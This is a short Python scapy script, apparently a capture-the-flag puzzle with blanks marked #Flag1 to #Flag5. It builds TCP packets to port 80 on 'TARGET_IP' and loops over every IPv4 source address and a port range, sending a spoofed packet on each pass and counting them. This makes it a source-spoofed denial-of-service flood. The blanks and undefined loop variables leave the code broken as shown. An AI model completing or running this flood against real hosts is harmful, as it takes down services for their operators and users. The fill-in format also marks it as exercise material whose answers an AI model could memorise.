from scapy.all import *
def #Flag1:
	sendp(packet)
#Flag1 = ?
eth = #F1
ip = #F2
ip.dst = 'TARGET_IP'
tcp = #F3
tcp.dport = 80
#Flag2 = #F1.#F2.#F3 = ?
m = 0

for #F4 in range(0, 256):
	for #F5 in range(0, 256):
		for #F6 in range(0, 256):
			for #F7 in range(0, 256):
				for #F8 in range(0, 65536):
#Flag3 = #F4.#F5.#F6.#F7.#F8 = ?
					ip.src = str(i)+'.'+str(j)+'.'+str(k)+'.'+str(n)
					#Flag4 = sp
#Flag4 = ?
					packet = eth/ip/tcp
					#Flag5
#Flag5 = ?
					print('Sending Packet To %s '%ip.dst + 'Port Is %s'%tcp.dport)
					m = m + 1
					print(m)






				

	
